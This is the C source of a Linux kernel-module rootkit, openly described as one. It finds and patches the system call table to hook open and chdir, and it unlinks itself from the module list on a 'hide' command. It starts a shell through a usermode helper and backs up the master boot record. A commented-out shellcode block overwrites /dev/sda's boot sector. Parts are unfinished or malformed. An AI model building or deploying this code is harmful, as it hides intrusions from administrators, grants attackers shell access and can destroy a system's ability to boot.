/**
 * @file    ktest.c
 * @author  krishna
 * @date    20171016
 * @version 0.1
 * @brief   Basic rootkit that hides itself and writes something to the MBR
*/

#include "ktest.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("krishna");
MODULE_DESCRIPTION("Let's test hooking LKM");
MODULE_VERSION("0.1");


/* copy the first 512 bytes of the MBR_DEVICE */
static void copy_mbr(void) 
{
    char *block = vmalloc(sizeof(char)*512);
    struct file *filp = NULL;
    struct file *filp2 = NULL;
    mm_segment_t oldfs;
    loff_t pos = 0;
    loff_t pos2 = 0;
    int retval;
    
    // get the file system and set to the kernel data segment
    oldfs = get_fs();
    set_fs(get_ds());
 
    // open file 
    filp = filp_open(MBR_DEVICE, O_RDONLY, 0);
    set_fs(oldfs);

    // save the file data to our buffer
    if (IS_ERR(filp)) {
        filp = NULL;
    } else {
        retval = vfs_read(filp, block, sizeof(char)*512, &pos);
        filp_close(filp, NULL);
    }
    
    // set the file system to the kernel data segment
    set_fs(get_ds());
   
    // open file 
    filp2 = filp_open(MBR_BACKUP, O_WRONLY|O_CREAT, 0666);

    // save the buffer to the file
    if (IS_ERR(filp2)) {
        printk(KERN_INFO "KTEST: Something went wrong.\n");
    } else {
        vfs_write(filp2, block, sizeof(char)*512, &pos2);
        filp_close(filp2, NULL);
    }
   
    // return to the old file system
    set_fs(oldfs);

    vfree(block);

}

/*forking functionality */
int thread_fn(){
	unsigned long j0,j1;
	int delay = 6000,
	j0 = jiffies_to_msecs(jiffies)/1000U;
	j1 = j0+delay;
	printk(KERN_INFO "KTEST: in the fork.\n");

	while(time_before(jiffies,j1))
		schedule();

	return 0;

} 
/*cleaning up fork  (call if neccessary/helperfuntion)*/
void thread_cleanup(void){
	int ret;
	ret = kthread_stop(thread1);
	if(!ret)
	printk(KERN_INFO "KTEST: fork exited.\n");

}

/* creating the Fork MBRManager */
static void fork_mbrmngr(void){
	//pid_t child;
	char our_thread[8] = "thread1";
	//long orig_eax;
	printk(KERN_INFO "KTEST: Parent before forking.\n");
	//child = sys_vfork();
	thread1 = kthread_create(thread_fn,NULL,our_thread);
	if(thread1){
		printk(KERN_INFO "KTEST: just before wakign forking.\n");
		wake_up_process(thread1);
	}
}


/* Overwrite the MBR */
static void overwrite_mbr(void){
    printk(KERN_INFO "KTEST: Assembly code for MBR overwrite not implemented.\n");
/*
__asm__ volatile(
; linux/x86 overwrite MBR on /dev/sda with `LOL!' 43 bytes
; root@thegibson
; 2010-01-15

section .text
	global _start

_start:
	; open("/dev/sda", O_WRONLY);
	mov al, 5
	xor ecx, ecx
	push ecx
	push dword 0x6164732f
	push dword 0x7665642f
	mov ebx, esp
	inc ecx
	int 0x80

	; write(fd, "LOL!"x128, 512);
	mov ebx, eax
	mov al, 4
	cdq
	push edx
	mov cl, 128
	fill:
		push dword 0x214c4f4c
	loop fill
	mov ecx, esp
	inc edx
	shl edx, 9
	int 0x80
)
*/

}

/* Return the first NEEDLE in HAYSTACK.  -- from PHRACK */
static void *memmem(const void *hay, size_t hay_len,
                    const void *needle, size_t needle_len) {
    const char *begin;
    const char *const end = (const char *) hay + hay_len - needle_len;

    // Empty string is at the beginning of the string.
    if (needle_len == 0)
        return (void *) hay;

    // Loop through the haystack element-by-element
    // If we find the needle, 
    // return the pointer to its location in the haystack
    if (hay_len >= needle_len) {
        for (begin = (const char *) hay; begin <= end; ++begin)
            if (begin[0] == ((const char *) needle)[0]
                && !memcmp((const void *) &begin[1],
                    (const void *) ((const char *) needle + 1),
                    needle_len - 1))
                return (void *) begin;
    }

    // The needle was not found, return NULL
    return NULL;
}

/* The sys_call_table is read-only => must make it RW before replacing a syscall */
void set_addr_rw(unsigned long addr) {
 
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
 
    if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}
 
/* Restores the sys_call_table as read-only */
void set_addr_ro(unsigned long addr) {
 
    unsigned int level;
    pte_t *pte = lookup_address(addr, &level);
 
    pte->pte = pte->pte &~_PAGE_RW;
}

/* Return the address of the sys_call_table */
static unsigned long *get_sys_call_table(void) {

    unsigned long *sct;
    unsigned long sct_off, sct_val;
    unsigned char code[512];

    // read the model specific register and copy it to code
    rdmsrl(MSR_LSTAR, sct_off);
    memcpy(code, (void *)sct_off, sizeof(code));

    // find the sys_call_table
    sct_val = (unsigned long) memmem(code, sizeof(code), "\xff\x14\xc5", 3);
    
    // if we found the syscall table in the assembler code dump
    // get the address of the sys_call_table
    if (sct_val) {
        sct = (unsigned long *) (* (unsigned long *)(sct_val + 3));
        sct = (unsigned long *) (((unsigned long) sct & 0xffffffff) | 0xffffffff00000000);
    } else {
        sct = 0;
    }
    
    // The needle was not found, return NULL
    return sct;
}

/* Start reverse ping listener */
static int start_listener(void){
	char *argv[] = { SHELL, NULL};
	static char *env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
	printk(KERN_INFO "KTEST: attempt %s.\n",argv[0]);
	//return call_usermodehelper("/bin/bash", SHELL, env, UMH_WAIT_PROC);
	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

/* Hide the kernel module */
void hide_module(void){
    // hide the module
    modList = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    THIS_MODULE->sect_attrs = NULL;
    THIS_MODULE->notes_attrs = NULL;
}


/* Show the kernel module */
void show_module(void){
    list_add(&THIS_MODULE->list, modList);
}


/* Driver instruction for open device */
int open_dev(struct inode *inode, struct file *filp){
    // Don't do anything on open.
    printk(KERN_INFO "KTEST: open_dev executed.\n");
    return 0;
}

/* Driver instruction for read device */
ssize_t read_dev(struct file *filp, char __user *buf, 
                 size_t count, loff_t *posPtr){
    // Don't do anything on read.
    printk(KERN_INFO "KTEST: read_dev executed.\n");
    return -EFAULT;
}

/* Driver instruction for write device */
static ssize_t write_dev(struct file *filp, 
                         const char *buff, size_t len, loff_t *posPtr){
    const char *cmdPtr;
    const char *cmdEndPtr;
    int i;
    char c;
    cmdPtr = buff;
    cmdEndPtr = buff + len - 1;
    i = 0;
    
    printk(KERN_INFO "KTEST: open_dev executed.\n");
    
    //This section handles our commands.
    if(len < MAX_CMD_LENGTH){
        memset(commands, 0, sizeof(commands));
	while(cmdPtr != cmdEndPtr){
            c = *cmdPtr;
            commands[i] = c;
            cmdPtr++;
            i++;
        }

        // hide the module        
        printk(KERN_INFO "KTEST: wrote command: |%s|.\n",commands);
        if(modHidden == 0 && strcmp(commands, "hide") == 0){
            hide_module();
            modHidden = 1;
            printk(KERN_INFO "KTEST: module hidden.\n");
        }

        // show the module        
        if(modHidden == 1 && strcmp(commands, "show") == 0){
            show_module();
            modHidden = 0;
            printk(KERN_INFO "KTEST: module visible.\n");
        }

        // start the shell listener      
        if(strcmp(commands, "shellUp") == 0){
            i = start_listener();
            if (i < 0)
                printk(KERN_INFO "KTEST: Something went wrong ShellUp.\n");
            printk(KERN_INFO "KTEST: Remote Shell listener started.\n");
        }

        // backup the MBR
        if(strcmp(commands, "backup") == 0) {
            copy_mbr();
            printk(KERN_INFO "KTEST: Created MBR backup.\n");
        }

        // overwrite the MBR
        if(strcmp(commands, "overwrite") == 0){
            overwrite_mbr();
            printk(KERN_INFO "KTEST: Written to MBR.\n");
        }
	// fork the MBR
        if(strcmp(commands, "fork") == 0){
            fork_mbrmngr();
            printk(KERN_INFO "KTEST: Forking MBR.\n");
        }
	if(strcmp(commands, "killfork") == 0){
            thread_cleanup();
            printk(KERN_INFO "KTEST: Fork killed.\n");
        }
    } else{
        printk(KERN_ALERT "maK_it: Command was too long.\n");
    }
    return -EINVAL;
}

/* Driver instruction for release device */
static int release_dev(struct inode *inode, struct file *filp){
    printk(KERN_INFO "KTEST: release_dev executed.\n");
    return 0;
}

/* Hook the open call */
static asmlinkage long kt_open(const char __user *filename, int flags, int mode) {

//    TODO: intercept read calls that open /dev/sda (location of the MBR)
//    printk(KERN_INFO "KTEST: Hooked the open call.\n");
    return (*open_asli) (filename, flags, mode);
}

static asmlinkage long kt_chdir(const char __user *filename) {

    printk(KERN_INFO "KTEST: Hooked the chdir call.\n");
    return (*chdir_asli) (filename);
}

struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = open_dev,
    .read = read_dev,
    .write = write_dev,
    .release = release_dev,
};

static int __init ktest_init(void) {

    int major;

    // Log that we've installed the module
    printk(KERN_INFO "KTEST: Module has started.\n");

    // Register a driver for the devie we created (see make file)
    sema_init(&s, 1);
    major = register_chrdev(DEVICE_MAJOR, DEVICE_NAME, &fops);
    if(major < 0){
        printk(KERN_INFO "KTEST: Major device failed with -1");
        return major;
    }

    // Get the address of the sys_call_table
    kt_sys_call_table = get_sys_call_table();
    printk(KERN_INFO "KTEST: sys_call_table is at |%p|.\n", kt_sys_call_table);

    // make the sys_call_table read/write
    set_addr_rw((unsigned long) kt_sys_call_table);

    // Save the original pointers system calls
    open_asli = (void *) (kt_sys_call_table[__NR_open]);
    chdir_asli= (void *) (kt_sys_call_table[__NR_chdir]);

    // Replace the system calls pointers with our hooks
    kt_sys_call_table[__NR_open] = kt_open;
    kt_sys_call_table[__NR_chdir] = kt_chdir;

    return 0;
}

static void __exit ktest_exit(void) {

    // Unregister the driver and release the commands mem
    unregister_chrdev(DEVICE_MAJOR, DEVICE_NAME);
    memset(commands, 0, sizeof(commands));

    // Restore the original pointers
    kt_sys_call_table[__NR_open] = open_asli;
    kt_sys_call_table[__NR_chdir] = chdir_asli;

    // make the sys_call_table read only
    set_addr_ro((unsigned long) kt_sys_call_table);
   
    printk(KERN_INFO "KTEST: The module has exited.\n");
}

module_init(ktest_init);
module_exit(ktest_exit);
